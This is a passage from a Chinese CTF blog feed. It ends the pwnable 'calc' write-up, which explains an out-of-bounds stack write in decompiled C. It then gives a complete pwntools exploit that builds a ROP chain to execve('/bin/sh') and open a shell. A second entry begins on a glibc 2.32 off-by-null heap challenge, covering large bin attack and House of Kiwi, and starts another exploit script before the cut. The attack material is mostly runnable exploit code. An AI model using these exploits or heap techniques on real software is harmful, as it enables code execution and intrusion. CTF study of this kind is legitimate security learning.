comment\">// 符号数组有东西执行操作，优先级判断，当前符号比算符栈顶优先级小时，从算符栈拿一个符号，从数栈拿两个数进行计算</span>\n        <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n          <span class=\"token keyword\">case</span> <span class=\"token string\">'%'</span><span class=\"token operator\">:</span>\n          <span class=\"token keyword\">case</span> <span class=\"token string\">'*'</span><span class=\"token operator\">:</span>\n          <span class=\"token keyword\">case</span> <span class=\"token string\">'/'</span><span class=\"token operator\">:</span>\n            <span class=\"token comment\">// #+      *</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">'+'</span> <span class=\"token operator\">&amp;&amp;</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">'-'</span> <span class=\"token punctuation\">)</span>\n              <span class=\"token keyword\">goto</span> LABEL_14<span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 如果符号栈顶为+-，则把当前符号入栈</span>\n            signs<span class=\"token punctuation\">[</span><span class=\"token operator\">++</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">case</span> <span class=\"token string\">'+'</span><span class=\"token operator\">:</span>\n          <span class=\"token keyword\">case</span> <span class=\"token string\">'-'</span><span class=\"token operator\">:</span>\nLABEL_14<span class=\"token operator\">:</span>\n            <span class=\"token comment\">// 进行计算，进行计算的两个数为nums末尾的两个数，计算算符为符号栈顶，之后将结果放进前一个数的位置，和栈结构类似，其实就是pop pop 计算 push</span>\n            <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 计算之后将当前符号入算符栈</span>\n            signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">default</span><span class=\"token operator\">:</span>\n            <span class=\"token comment\">// 到用户输入末尾，直接进行计算</span>\n            <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token keyword\">else</span>\n      <span class=\"token punctuation\">&#123;</span>\n        signs<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>user_input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n      <span class=\"token comment\">// 如果此时到达用户输入结尾则退出循环</span>\n      <span class=\"token comment\">// 但是这个判断放在了最后，很奇怪</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> index <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> signs<span class=\"token punctuation\">[</span>index<span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>eval 函数</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">_DWORD <span class=\"token operator\">*</span>__cdecl <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span>nums<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> sign<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  _DWORD <span class=\"token operator\">*</span>result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sign <span class=\"token operator\">==</span> <span class=\"token string\">'+'</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sign <span class=\"token operator\">></span> <span class=\"token string\">'+'</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sign <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sign <span class=\"token operator\">==</span> <span class=\"token string\">'/'</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">/=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sign <span class=\"token operator\">==</span> <span class=\"token string\">'*'</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*=</span> nums<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  result <span class=\"token operator\">=</span> nums<span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">--</span><span class=\"token operator\">*</span>nums<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>上面的函数存在以下问题，当用户输入的数据是以符号开头的，则数栈中只有两个数：第一个数 nums [0] 为该数组的长度，第二个数为操作数，那么执行 eval 时则会对 nums [0] 和 nums [1] 进行操作，而 nums [0] 则存放了数栈的大小，而程序由于判断有问题，即使输入不合法也会执行一个 eval，那么就实现了对 nums [idx] 中 idx 的控制，从而可以实现对 nums 的越界读写</p>\n<blockquote>\n<p>如用户输入 +120，此时</p>\n<p>nums[0] = 1</p>\n<p>nums[1] = 120</p>\n<p>执行 eval 后 nums [0] += nums [1] , 此时</p>\n<p>nums[0] = 121</p>\n<p><strong>数组长度反而变成 121 了，那么在下次如果是输出结果则会输出 nums [121]，如果继续读入数时会在  nums [122] 写入这个数，之后执行 eval 时会将结果放进 nums [121] 从而实现数组的越界读写</strong></p>\n</blockquote>\n<p>因为本程序为 32 位静态链接，所有 gadget 可以在程序中找到，故直接在返回地址写上 syscall 的 rop 调用链</p>\n<p>exp</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./calc'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    <span class=\"token comment\"># execve 只能是 /bin/sh\\x00</span>\n\n    syscall <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'int 0x80'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_eax_ret <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop eax;ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_edx_ecx_ebx_ret <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop edx ; pop ecx ; pop ebx ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'=== Welcome to SECPROG calculator ==='</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token string\">'+360'</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token punctuation\">)</span>\n    ebp <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff</span> <span class=\"token operator\">-</span> rint<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n    stack_addr <span class=\"token operator\">=</span> ebp \n    \n    rop_chain <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n        pop_edx_ecx_ebx_ret<span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        stack_addr<span class=\"token punctuation\">,</span>\n        pop_eax_ret<span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xb</span><span class=\"token punctuation\">,</span>\n        syscall\n    <span class=\"token punctuation\">]</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'pop_edx_ecx_ebx_ret'</span><span class=\"token punctuation\">,</span>pop_edx_ecx_ebx_ret<span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+361+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x26d37</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+362-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x26d37</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+363-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x26d37</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+364+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">/</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x26d37</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+364+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">/</span><span class=\"token number\">2</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+365-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">/</span><span class=\"token number\">2</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+365+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>pop_eax_ret<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+366-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>pop_eax_ret<span class=\"token operator\">&amp;</span><span class=\"token number\">0xfffffff0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+367-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>pop_eax_ret<span class=\"token operator\">&amp;</span><span class=\"token number\">0xfffffff0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+367+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+368-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+368+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6e69622f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+369-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6e69622f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+369+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x68732f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># dbg()</span>\n    \n    <span class=\"token comment\"># p.success(getShell())</span>\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   calc.py\n@Time    :   2022/02/06 23:14:52\n@Author  :   Niyah \n'''</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "堆",
                "pwnable"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/Fmyy_Challenge/",
            "url": "http://niyah.cn/CTF/Fmyy_Challenge/",
            "title": "Fmyy_Challenge",
            "date_published": "2022-01-29T16:00:00.000Z",
            "content_html": "<blockquote>\n<p>复现了一下 fmyy 师傅出的题目，不得不感叹 fmyy 唯一真神</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"null_fxck\"><a class=\"markdownIt-Anchor\" href=\"#null_fxck\">#</a> NULL_FXCK</h1>\n<p>2.32 版本 libc 存在一个 off by null</p>\n<h2 id=\"地址泄露\"><a class=\"markdownIt-Anchor\" href=\"#地址泄露\">#</a> 地址泄露</h2>\n<p>首先是堆地址和 libc 地址的泄露，这里参考 wjh 师傅的不用爆破 off by null 利用方法：</p>\n<p><a href=\"http://blog.wjhwjhn.com/archives/193/\">glibc 2.29-2.32 off by null bypass - wjh’s blog (wjhwjhn.com)</a></p>\n<h2 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<p>两种 Large bin attack 思路</p>\n<ul>\n<li>通过 Large bin attack 攻击 TLS 结构体劫持 Tcache 管理块</li>\n<li>通过 Large bin attack 攻击 mp_ 让 Tcache 管理块溢出到可控堆块</li>\n</ul>\n<p>因为本题使用了 _exit 也无法从 main 函数返回，所以无法执行简单的 house of pig，需要使用 __malloc_assert 触发 FSOP，因此可以直接使用 House of Kiwi，在特定内存布置 entries ，之后就可以申请到任意位置，包括 House of Kiwi 的各种条件</p>\n<p>其实本题是打算用 house of pig 来做的，但是思来想去好像确实是有些麻烦，既然能造成任意申请原语，就没必要再进行 house of pig 了，并且也只需要进行一次 Large Bin Attack</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> Exp</h2>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\"># context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./NULL_FXCK'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token 